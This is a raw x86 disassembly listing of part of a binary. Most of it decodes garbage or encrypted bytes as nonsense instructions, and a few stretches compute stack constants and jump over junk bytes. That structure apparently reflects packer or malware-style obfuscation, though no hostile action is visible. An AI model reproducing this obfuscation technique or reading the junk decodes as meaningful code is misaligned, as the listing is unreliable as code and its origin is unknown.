  40be9b:	scas   al,BYTE PTR es:[edi]
  40be9c:	imul   eax,DWORD PTR [ebp-0x1fcf616b],0x50f31b5
  40bea6:	pop    esp
  40bea7:	or     esi,0x86adc534
  40bead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beae:	stos   BYTE PTR es:[edi],al
  40beaf:	lock sbb bh,BYTE PTR [ebp+0x380a1e1c]
  40beb6:	ins    DWORD PTR es:[edi],dx
  40beb7:	push   es
  40beb8:	mov    ds:0xbe37b17d,eax
  40bebd:	out    dx,eax
  40bebe:	mov    dl,0x88
  40bec0:	mov    es,WORD PTR [ecx+0x5fdab624]
  40bec6:	push   esp
  40bec7:	in     al,0x51
  40bec9:	jnp    0x40beb5
  40becb:	inc    eax
  40becc:	add    al,0x7
  40bece:	mov    esi,esi
  40bed0:	add    ah,BYTE PTR [edi]
  40bed2:	mov    ebp,0x3b269a0d
  40bed7:	push   es
  40bed8:	jns    0x40bec1
  40beda:	push   ebx
  40bedb:	aam    0x18
  40bedd:	dec    edx
  40bede:	retf   
  40bedf:	mov    eax,ds:0x710eb5e0
  40bee4:	pop    es
  40bee5:	dec    eax
  40bee6:	push   ebx
  40bee7:	mov    ch,BYTE PTR [eax-0x48]
  40beea:	xchg   BYTE PTR ds:0x9c6c8d4f,ch
  40bef0:	lahf   
  40bef1:	cmp    dl,BYTE PTR [ebp-0x44]
  40bef4:	fwait
  40bef5:	call   0xd5ec:0xcf7e0cff
  40befc:	xchg   esi,eax
  40befd:	add    BYTE PTR [edi+0x39],ch
  40bf00:	adc    al,0xb5
  40bf02:	adc    eax,DWORD PTR [ecx]
  40bf04:	push   edx
  40bf05:	xor    DWORD PTR [ebx],esi
  40bf07:	mov    DWORD PTR [ebp-0x4],0x7584
  40bf0e:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40bf15:	mov    eax,DWORD PTR [ebp-0x8]
  40bf18:	xor    edx,edx
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi+0x3ac6d590],1
  40bf66:	xchg   edx,eax
  40bf67:	inc    edx
  40bf68:	(bad)  
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0xdcbad7f8
  40bf73:	xlat   BYTE PTR ds:[ebx]
  40bf74:	inc    eax
  40bf75:	mov    ds,ebp
  40bf77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf78:	jmp    DWORD PTR es:[ecx-0x44d3bcf2]
  40bf7f:	push   0xffffff8d
  40bf81:	cmp    bl,BYTE PTR [ecx-0x53]
  40bf84:	jmp    0x40bf09
  40bf86:	dec    esi
  40bf87:	fs gs xchg edx,eax
  40bf8a:	int3   
  40bf8b:	pop    edi
  40bf8c:	jne    0x40bf8c
  40bf8e:	mov    ebp,0xfac6e9ad
  40bf93:	in     al,0xc6
  40bf95:	xor    al,0xc
  40bf97:	dec    ecx
  40bf98:	ror    DWORD PTR [ebp-0x5839e15b],0xf6
  40bf9f:	push   ss
  40bfa0:	int    0xcb
  40bfa2:	ret    
  40bfa3:	push   ebp
  40bfa4:	mov    DWORD PTR [ebp+0x7e],esp
  40bfa7:	inc    edi
  40bfa8:	cli    
  40bfa9:	iret   
  40bfaa:	sub    DWORD PTR [ebp-0x61e6ca64],ebp
  40bfb0:	cli    
  40bfb1:	(bad)  
  40bfb2:	adc    eax,0x18a5886e
  40bfb7:	imul   ebp,DWORD PTR [ecx+0x65e85ff8],0xffffffb1
  40bfbe:	push   ebp
  40bfbf:	mov    eax,DWORD PTR [ecx]
  40bfc1:	dec    esp
  40bfc2:	aaa    
  40bfc3:	fsubr  QWORD PTR ds:0xf117ee5c
  40bfc9:	stc    
  40bfca:	jae    0x40bf5d
  40bfcc:	gs das 
  40bfce:	adc    DWORD PTR [edi],eax
  40bfd0:	call   0xa52c:0x8114858e
  40bfd7:	stc    
  40bfd8:	xor    dh,BYTE PTR [ebx]
  40bfda:	jne    0x40bfa0
  40bfdc:	and    DWORD PTR es:[esi-0x51],esp
  40bfe0:	out    dx,al
  40bfe1:	mov    dh,0xc9
  40bfe3:	and    DWORD PTR [ecx],0xa6ddc38b
  40bfe9:	leave  
  40bfea:	repnz inc ebp
  40bfec:	pushf  
  40bfed:	aaa    
  40bfee:	mov    eax,ds:0x855d620
  40bff3:	xor    al,0x4b
  40bff5:	cmp    edi,DWORD PTR [ecx]
  40bff7:	(bad)  [esi]
  40bff9:	dec    ebp
  40bffa:	jnp    0x40bfa1
  40bffc:	sub    BYTE PTR [esi],dl
  40bffe:	clc    
  40bfff:	inc    ebp
  40c000:	cmc    
  40c001:	push   edx
  40c002:	jns    0x40c017
  40c004:	mov    esi,0xeea1743a
  40c009:	push   ebx
  40c00a:	fcom   QWORD PTR [ebx]
  40c00c:	aad    0x45
  40c00e:	scas   eax,DWORD PTR es:[edi]
  40c00f:	xchg   eax,edi
  40c011:	sbb    DWORD PTR [edi+0x30a9c2f6],ebp
  40c017:	daa    
  40c018:	xchg   esp,eax
  40c019:	or     al,0x7a
  40c01b:	mov    ecx,0x93845424
  40c020:	(bad)  
  40c021:	jp     0x40c062
  40c023:	icebp  
  40c024:	mov    ch,BYTE PTR [ebx-0x10d6e622]
  40c02a:	ins    DWORD PTR es:[edi],dx
  40c02b:	std    
  40c02c:	adc    al,BYTE PTR [eax-0x750e94b1]
  40c032:	jmp    0x40c097
  40c034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c035:	cmp    eax,0xabd016e3
  40c03a:	fxtract 
  40c03c:	adc    DWORD PTR [ebx],edx
  40c03e:	jnp    0x40c075
  40c040:	jle    0x40bfc2
  40c042:	xor    esp,0x55a0c51f
  40c048:	fst    DWORD PTR [edx-0x20]
  40c04b:	pop    eax
  40c04c:	(bad)  
  40c04d:	mov    eax,ds:0x3899f4a7
  40c052:	rcr    BYTE PTR [edx],1
  40c054:	xor    al,bl
  40c056:	gs scas al,BYTE PTR es:[edi]
  40c058:	fadd   DWORD PTR [esi-0x69]
  40c05b:	xchg   ebp,eax
  40c05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c05d:	sbb    al,0xf2
  40c05f:	das    
  40c060:	ins    BYTE PTR es:[edi],dx
  40c061:	inc    ebx
  40c062:	push   eax
  40c063:	sub    eax,0xaabc17e
  40c068:	and    al,0xd
  40c06a:	push   esi
  40c06b:	retf   0x5534
  40c06e:	aam    0xaf
  40c070:	leave  
  40c071:	mov    eax,ds:0x9ace2741
  40c076:	sbb    esp,DWORD PTR [ebx+ecx*1+0x7308e118]
  40c07d:	mov    bh,0xac
  40c07f:	aam    0xa6
  40c081:	jbe    0x40c101
  40c083:	scas   eax,DWORD PTR es:[edi]
  40c084:	call   0x4f16a66a
  40c089:	push   edi
  40c08a:	(bad)  
  40c08c:	sbb    bh,ah
  40c08e:	or     eax,edi
  40c090:	jecxz  0x40c0e1
  40c092:	jge    0x40c042
  40c094:	sti    
  40c095:	adc    ch,BYTE PTR [edx-0x43]
  40c098:	ffreep st(0)
  40c09a:	int3   
  40c09b:	sub    ebx,esi
  40c09d:	xchg   DWORD PTR [ecx-0x43],ebp
  40c0a0:	mov    eax,cs
  40c0a2:	ja     0x40c08e
  40c0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a5:	cmp    BYTE PTR [esi+0x7c81b062],al
  40c0ab:	retf   0xa682
  40c0ae:	push   0x1b1c296d
  40c0b3:	shl    BYTE PTR [edi+0x58db0617],cl
  40c0b9:	cwde   
  40c0ba:	jbe    0x40c04c
  40c0bc:	push   0xdbeb439f
  40c0c1:	sti    
  40c0c2:	icebp  
  40c0c3:	(bad)  
  40c0c4:	push   ebp
  40c0c5:	jle    0x40c0f5
  40c0c7:	sub    dh,dl
  40c0c9:	dec    esp
  40c0ca:	mov    BYTE PTR [ebx+0x263f2bef],dh
  40c0d0:	cdq    
  40c0d1:	dec    ecx
  40c0d2:	push   ds
  40c0d3:	jl     0x40c0ff
  40c0d5:	and    BYTE PTR [eax+0x5f],cl
  40c0d8:	push   eax
  40c0d9:	mov    edx,0xc34993f8
  40c0de:	jnp    0x40c089
  40c0e0:	jnp    0x40c0ef
  40c0e2:	sbb    bl,al
  40c0e4:	imul   ecx
  40c0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0e7:	sub    BYTE PTR [eax],dl
  40c0e9:	xor    cl,bl
  40c0eb:	adc    cl,BYTE PTR [ebx]
  40c0ed:	pop    ss
  40c0ee:	outs   dx,BYTE PTR ds:[esi]
  40c0ef:	dec    edi
  40c0f0:	mov    ecx,0x3bae0542
  40c0f5:	or     BYTE PTR [ecx+edx*2-0x2c2490eb],0x37
  40c0fd:	jge    0x40c13e
  40c0ff:	jge    0x40c173
  40c101:	ret    
  40c102:	mov    WORD PTR [ebp-0x25],?
  40c105:	xchg   ebp,eax
  40c106:	hlt    
  40c107:	aas    
  40c108:	mov    al,0x66
  40c10a:	adc    dl,BYTE PTR [eax]
  40c10c:	sbb    ecx,esp
  40c10e:	mov    ds:0x9c4cbe2f,al
  40c113:	sbb    ebp,DWORD PTR [eax+ecx*2-0x9]
  40c117:	cli    
  40c118:	pop    esp
  40c119:	pop    edi
  40c11a:	inc    edx
  40c11b:	stos   DWORD PTR es:[edi],eax
  40c11c:	sbb    eax,0x9688cdb5
  40c121:	sbb    al,0x7
  40c123:	imul   edi,DWORD PTR [edx],0x57f6f01c
  40c129:	mov    al,ds:0xd5700f1
  40c12e:	ins    DWORD PTR es:[edi],dx
  40c12f:	ins    DWORD PTR es:[edi],dx
  40c130:	out    dx,al
  40c131:	out    0x59,eax
  40c133:	fist   WORD PTR [edx+0x7d]
  40c136:	or     al,0x8a
  40c138:	cld    
  40c139:	iret   
  40c13a:	and    cl,cl
  40c13c:	pop    ss
  40c13d:	jmp    0x40c0bf
  40c13f:	out    dx,al
  40c140:	sub    esi,ebp
  40c142:	test   BYTE PTR [eax+0x6b328a17],dl
  40c148:	jmp    0x40c101
  40c14a:	sbb    bh,dl
  40c14c:	add    DWORD PTR [esi+0x577d41e3],esp
  40c152:	in     al,0xaf
  40c154:	mov    al,0x19
  40c156:	retf   
  40c157:	mov    al,0x90
  40c159:	or     eax,0xf688f477
  40c15e:	retf   
  40c15f:	cmp    al,0xe1
  40c161:	cmp    eax,0x4deaeda5
  40c166:	adc    dl,BYTE PTR [esi+0x675060aa]
  40c16c:	das    
  40c16d:	js     0x40c19a
  40c16f:	sbb    eax,0xb80cb391
  40c174:	inc    edx
  40c175:	mov    al,ch
  40c177:	in     al,dx
  40c178:	je     0x40c1b6
  40c17a:	aad    0xc3
  40c17c:	fs aas 
  40c17e:	leave  
  40c17f:	xor    DWORD PTR [edx+0x63],esp
  40c182:	mov    eax,ds:0xc7dcecf3
  40c187:	push   ebp
  40c188:	adc    edx,DWORD PTR [edi-0x64428900]
  40c18e:	loop   0x40c1c0
  40c190:	std    
  40c191:	rcl    BYTE PTR [eax],cl
  40c193:	stos   BYTE PTR es:[edi],al
  40c194:	scas   al,BYTE PTR es:[edi]
  40c195:	in     al,dx
  40c196:	mov    al,ds:0x7576487b
  40c19b:	jne    0x40c17d
  40c19d:	adc    cl,cl
  40c19f:	imul   DWORD PTR ds:0x33bdc3c8
  40c1a5:	xor    esi,ebx
  40c1a7:	push   ecx
  40c1a8:	int3   
  40c1a9:	es (bad) 
  40c1ac:	sub    al,0xd3
  40c1ae:	scas   al,BYTE PTR es:[edi]
  40c1af:	js     0x40c212
  40c1b1:	push   edi
  40c1b2:	xor    al,0xa3
  40c1b4:	or     DWORD PTR [ecx-0x2f],ebx
  40c1b7:	ins    DWORD PTR es:[edi],dx
  40c1b8:	mov    ebp,0x1a2730b0
  40c1bd:	lods   al,BYTE PTR ds:[esi]
  40c1be:	ins    DWORD PTR es:[edi],dx
  40c1bf:	jbe    0x40c17e
  40c1c1:	outs   dx,DWORD PTR ds:[esi]
  40c1c2:	iret   
  40c1c3:	cmc    
  40c1c4:	jbe    0x40c15b
  40c1c6:	adc    BYTE PTR [edi+edx*2-0x5d1c5c04],bl
  40c1cd:	inc    ecx
  40c1ce:	fmul   QWORD PTR ds:0x57ccd87
  40c1d4:	int    0xac
  40c1d6:	dec    edi
  40c1d7:	fsubr  QWORD PTR [edi+0x75]
  40c1da:	mov    cl,BYTE PTR [edi-0xf]
  40c1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1de:	pop    edx
  40c1df:	cmp    DWORD PTR [ecx-0x61],esi
  40c1e2:	push   edi
  40c1e3:	add    esi,esp
  40c1e5:	inc    esp
  40c1e6:	aaa    
  40c1e7:	(bad)  [edi]
  40c1e9:	cmp    DWORD PTR [esi-0x5c],ebp
  40c1ec:	inc    edi
  40c1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ee:	jns    0x40c176
  40c1f0:	rcr    BYTE PTR [edi+0x79fea5e3],cl
  40c1f6:	scas   al,BYTE PTR es:[edi]
  40c1f7:	mov    al,0x7
  40c1f9:	retf   0x3f22
  40c1fc:	pushf  
  40c1fd:	aad    0x5e
  40c1ff:	js     0x40c1b0
  40c201:	sbb    ebx,DWORD PTR [edi-0x3e9828a0]
  40c207:	gs das 
  40c209:	fadd   QWORD PTR [esi]
  40c20b:	xchg   esi,eax
  40c20c:	cmp    edx,eax
  40c20e:	test   al,0xd1
  40c210:	sub    BYTE PTR [eax],0x66
  40c213:	pushw  ds
  40c215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c216:	fst    QWORD PTR [edi+0x78aff9c5]
  40c21c:	pop    edi
  40c21d:	jl     0x40c25d
  40c21f:	pusha  
  40c220:	scas   eax,DWORD PTR es:[edi]
  40c221:	out    dx,al
  40c222:	test   eax,0x977f9b44
  40c227:	xor    DWORD PTR [ebx+0xa8335af],eax
  40c22d:	aad    0x33
  40c22f:	(bad)  
  40c230:	push   ss
  40c231:	mov    ds,ecx
  40c233:	add    DWORD PTR [edx-0x7a],ecx
  40c236:	push   0xffffffe7
  40c238:	pusha  
  40c239:	xlat   BYTE PTR ds:[ebx]
  40c23a:	cmp    esi,DWORD PTR [ebx]
  40c23c:	push   edi
  40c23d:	add    eax,0x91eebe2b
  40c242:	rcl    edx,cl
  40c244:	test   DWORD PTR [ecx],edi
  40c246:	scas   al,BYTE PTR es:[edi]
  40c247:	es mov ah,0xe6
  40c24a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c24c:	jne    0x40c1cf
  40c24e:	jmp    0xb6e6:0xe0d66c79
  40c255:	addr16 ror ebx,1
  40c258:	scas   eax,DWORD PTR es:[edi]
  40c259:	daa    
  40c25a:	into   
  40c25b:	jg     0x40c293
  40c25d:	mov    edi,0xe7a790b0
  40c262:	cmovb  ebx,DWORD PTR [eax-0xd]
  40c266:	pop    esi
  40c267:	std    
  40c268:	ror    BYTE PTR [edx-0x2cabe8ba],cl
  40c26e:	add    al,0x55
  40c270:	imul   eax,DWORD PTR [edx-0x2c],0xe3c6c852
  40c277:	push   eax
  40c278:	dec    eax
  40c279:	call   0xd738:0x8ae205b3
  40c280:	jbe    0x40c28a
  40c282:	lods   al,BYTE PTR fs:[esi]
  40c284:	cli    
  40c285:	test   DWORD PTR [ecx+0x2f4b8f41],esi
  40c28b:	scas   eax,DWORD PTR es:[edi]
  40c28c:	push   eax
  40c28d:	inc    edi
  40c28e:	add    al,0x6b
  40c290:	nop
  40c291:	cdq    
  40c292:	sub    eax,DWORD PTR [esi+0x2]
  40c295:	inc    ebp
  40c296:	pop    ss
  40c297:	sbb    BYTE PTR [esi+0x19080fa6],ch
  40c29d:	pop    edi
  40c29e:	xor    esp,DWORD PTR [di]
  40c2a1:	push   esi
  40c2a2:	aad    0x3c
  40c2a4:	aad    0x3e
  40c2a6:	ins    DWORD PTR es:[edi],dx
  40c2a7:	arpl   WORD PTR [edi+0x24],sp
  40c2aa:	xor    dl,BYTE PTR [eax]
  40c2ac:	sar    BYTE PTR [edi],0x68
  40c2af:	sbb    DWORD PTR [edx],0xffffffcb
  40c2b2:	arpl   WORD PTR [edi-0xc],cx
  40c2b5:	sub    cl,BYTE PTR [edi-0x3b]
  40c2b8:	push   0x44c9ec28
  40c2bd:	and    ch,BYTE PTR [esi-0x1bd63b95]
  40c2c3:	xchg   ebx,eax
  40c2c4:	sbb    bl,BYTE PTR [ecx+ebx*2-0x1fc62bcd]
  40c2cb:	int3   
  40c2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2cd:	xchg   esp,eax
  40c2ce:	inc    ebx
  40c2cf:	xchg   ebp,eax
  40c2d0:	mov    esp,0x9f6131c9
  40c2d5:	lods   eax,DWORD PTR ds:[esi]
  40c2d6:	call   0xb790:0x3dd8c585
  40c2dd:	in     al,0x42
  40c2df:	jno    0x40c322
  40c2e1:	inc    edx
  40c2e2:	mov    edi,0x1605c0c7
  40c2e7:	cwde   
  40c2e8:	ins    DWORD PTR es:[edi],dx
  40c2e9:	jl     0x40c2ad
  40c2eb:	hlt    
  40c2ec:	sahf   
  40c2ed:	add    bh,cl
  40c2ef:	iret   
  40c2f0:	sub    al,0x4b
  40c2f2:	imul   esi,DWORD PTR gs:[eax-0x15],0x39
  40c2f7:	mov    edi,0x6a3fbfbb
  40c2fc:	push   cs
  40c2fd:	gs icebp 
  40c2ff:	mov    dh,0xc8
  40c301:	sbb    eax,0x4696af8d
  40c306:	cdq    
  40c307:	(bad)  
  40c309:	int    0x2a
  40c30b:	call   0xc0f:0x128a
  40c311:	cmp    BYTE PTR [ebx+edx*8-0x27bcd73b],ah
  40c318:	pusha  
  40c319:	lods   al,BYTE PTR ds:[esi]
  40c31a:	dec    edi
  40c31b:	mov    al,0x5d
  40c31d:	dec    eax
  40c31e:	push   ds
  40c31f:	ret    0xedd0
  40c322:	jne    0x40c338
  40c324:	push   ebp
  40c325:	dec    esp
  40c326:	daa    
  40c327:	fstp   QWORD PTR [eax]
  40c329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c32a:	lds    ebx,FWORD PTR [eax]
  40c32c:	jae    0x40c34e
  40c32e:	pop    edx
  40c32f:	mov    ecx,fs
  40c331:	mov    esi,0xe6bfc060
  40c336:	ins    DWORD PTR es:[edi],dx
  40c337:	loop   0x40c34f
  40c339:	cs and al,0xc2
  40c33c:	xchg   esp,eax
  40c33d:	lods   eax,DWORD PTR ds:[esi]
  40c33e:	neg    DWORD PTR [ecx]
  40c340:	xlat   BYTE PTR ds:[ebx]
  40c341:	test   BYTE PTR ds:0xa15afd4a,ch
  40c347:	xchg   edi,eax
  40c349:	sub    DWORD PTR [ebx],eax
  40c34b:	and    bh,BYTE PTR [esp+edx*1+0x5d6794e8]
  40c352:	jle    0x40c387
  40c354:	jge    0x40c358
  40c356:	adc    cl,BYTE PTR [ebx-0x30e813d0]
  40c35c:	push   edi
  40c35d:	lea    eax,[ecx+eax*1-0x65ec]
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi+0xc129cf],ebp
  40c476:	fst    QWORD PTR [esi]
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0x8cbdeba5
  40c483:	imul   eax,DWORD PTR [ecx],0x77c4392d
  40c489:	pop    edx
  40c48a:	jg     0x40c4f9
  40c48c:	call   0x1735527a
  40c491:	loope  0x40c50f
  40c493:	dec    esi
  40c494:	hlt    
  40c495:	lods   eax,DWORD PTR ds:[esi]
  40c496:	xor    BYTE PTR [ecx-0x5fc74690],dh
  40c49c:	pop    ds
  40c49d:	push   eax
  40c49e:	popa   
  40c49f:	adc    eax,0x40572f67
  40c4a4:	jmp    0x40c449
  40c4a6:	mov    DWORD PTR [ebx+0xe],ecx
  40c4a9:	(bad)
  40c4ac:	aam    0x10
  40c4ae:	aad    0x37
  40c4b0:	into   
  40c4b1:	push   edx
  40c4b2:	pop    edx
  40c4b3:	test   eax,0x272f9a41
  40c4b8:	scas   eax,DWORD PTR es:[edi]
  40c4b9:	mov    esp,0x2595c25a
  40c4be:	push   edx
  40c4bf:	mov    ch,dl
  40c4c1:	lods   al,BYTE PTR ds:[esi]
  40c4c2:	mov    esp,0x33dab01f
  40c4c7:	jns    0x40c522
  40c4c9:	sub    eax,DWORD PTR [edx+0xc1c3a06]
  40c4cf:	retf   
  40c4d0:	add    eax,0x2fe0b029
  40c4d5:	dec    ebx
  40c4d6:	ss ss mov cx,0xef7f
  40c4dc:	mov    ds:0x21ea13de,eax
  40c4e1:	mov    cl,0xf3
  40c4e3:	retf   
  40c4e4:	fs add al,0x49
  40c4e7:	bound  esi,QWORD PTR [ebx+0x51162441]
  40c4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ee:	adc    DWORD PTR [ecx-0x1c],0xffffffff
  40c4f2:	push   esp
  40c4f3:	and    BYTE PTR [ebx+0x20],dl
  40c4f6:	iret   
  40c4f7:	call   DWORD PTR [esi+0x597eeb2f]
  40c4fd:	pop    edi
  40c4fe:	sbb    edx,DWORD PTR [ecx+0x6c]
  40c501:	mov    ds:0xd56d5694,eax
  40c506:	jge    0x40c54b
  40c508:	and    DWORD PTR [eax-0x40],eax
  40c50b:	push   edi
  40c50c:	mov    esi,0xa14aa2f7
  40c511:	popa   
  40c512:	aaa    
  40c513:	jb     0x40c50f
  40c515:	push   ds
  40c516:	jne    0x40c4db
  40c518:	retf   0x596d
  40c51b:	cdq    
  40c51c:	dec    edi
  40c51d:	pop    edi
  40c51e:	aad    0xa4
  40c520:	pop    eax
  40c521:	adc    ebp,0x4e2a3b45
  40c527:	mul    BYTE PTR [ecx+0x37]
  40c52a:	(bad)
  40c52d:	mov    bl,0x8d
  40c52f:	xchg   edx,eax
  40c530:	dec    esi
  40c531:	popa   
  40c532:	push   edx
  40c533:	sub    eax,0x20396e6d
  40c538:	dec    ebp
  40c539:	and    eax,0x70523465
  40c53e:	mov    esp,0x7ea92e46
  40c543:	sbb    BYTE PTR cs:[eax+0x7a],dh
  40c547:	arpl   WORD PTR [ebp+0x62],si
  40c54a:	or     dh,dh
  40c54c:	shr    DWORD PTR [esi-0x701c99],cl
  40c552:	jl     0x40c4fa
  40c554:	push   edx
  40c555:	pushf  
  40c556:	stos   DWORD PTR es:[edi],eax
  40c557:	(bad)  
  40c558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c559:	mov    al,0x60
  40c55b:	scas   al,BYTE PTR es:[edi]
  40c55c:	lods   al,BYTE PTR ds:[esi]
  40c55d:	xlat   BYTE PTR ds:[ebx]
  40c55e:	cs xchg esp,eax
  40c560:	and    ch,BYTE PTR ds:0x674e6103
  40c566:	and    eax,DWORD PTR [esi-0x39]
  40c569:	mov    cl,0xc1
  40c56b:	lock inc eax
  40c56d:	pop    eax
  40c56e:	out    0x9b,eax
  40c570:	aaa    
  40c571:	test   BYTE PTR [edx+0x70498788],bh
  40c577:	out    dx,eax
  40c578:	xchg   esp,eax
  40c579:	imul   edi,DWORD PTR [edx],0x30e715cd
  40c57f:	aad    0x70
  40c581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c582:	push   edx
  40c583:	jl     0x40c5ec
  40c585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c586:	mov    dl,0x67
  40c588:	and    al,BYTE PTR [ebx-0x71f545ca]
  40c58e:	fsubp  st(0),st
  40c590:	loopne 0x40c514
  40c592:	sbb    al,0x82
  40c594:	and    al,0x9e
  40c596:	pop    ebx
  40c597:	inc    ebx
  40c598:	push   eax
  40c599:	and    BYTE PTR [ecx+0x69a4b570],al
  40c59f:	lock nop
  40c5a1:	sbb    DWORD PTR [edx],0xffffffdc
  40c5a4:	jbe    0x40c5a5
  40c5a6:	and    eax,0x72b2e376
  40c5ab:	push   edx
  40c5ac:	scas   al,BYTE PTR es:[edi]
  40c5ad:	bound  edx,QWORD PTR [edi+0x6e]
  40c5b0:	add    bh,cl
  40c5b2:	into   
  40c5b3:	xchg   ebp,eax
  40c5b4:	sbb    esp,DWORD PTR [ebx-0x18]
  40c5b7:	xchg   edx,eax
  40c5b8:	bound  ebx,QWORD PTR [ecx-0x18916ec5]
  40c5be:	rol    BYTE PTR [ebp-0x17],0xed
  40c5c2:	imul   ebp,DWORD PTR [edx],0xfffffff2
  40c5c5:	bound  esp,QWORD PTR [edx]
  40c5c7:	mov    esp,0xb2762912
  40c5cc:	in     eax,0x17
  40c5ce:	call   0xb77c71c8
  40c5d3:	mov    esi,DWORD PTR [eax+0x73c8d453]
  40c5d9:	add    eax,0x81789646
  40c5de:	jmp    0xbe2:0x861395cd
  40c5e5:	stos   BYTE PTR es:[edi],al
  40c5e6:	inc    ebx
  40c5e7:	mov    dh,0x9c
  40c5e9:	or     BYTE PTR [ecx],cl
  40c5eb:	and    DWORD PTR [esi+0x66],0xfffffff7
  40c5ef:	sti    
  40c5f0:	adc    ch,BYTE PTR [esp+eiz*8+0x368db449]
  40c5f7:	outs   dx,DWORD PTR ds:[esi]
  40c5f8:	inc    ebp
  40c5f9:	pusha  
  40c5fa:	adc    al,dl
  40c5fc:	xchg   ebx,eax
  40c5fd:	xchg   esi,eax
  40c5fe:	mov    DWORD PTR [ebx-0x4b81d7f],edx
  40c604:	sbb    DWORD PTR [esi-0x6d],ecx
  40c607:	cli    
  40c608:	jbe    0x40c5d8
  40c60a:	(bad)  
  40c60b:	mov    cl,BYTE PTR [ebx+eax*1]
  40c60e:	rol    ebp,1
  40c610:	mov    ds:0x70f15a5f,al
  40c615:	popf   
  40c616:	sbb    al,0x3a
  40c618:	pop    ecx
  40c619:	fs push ebp
  40c61b:	sbb    al,0x2e
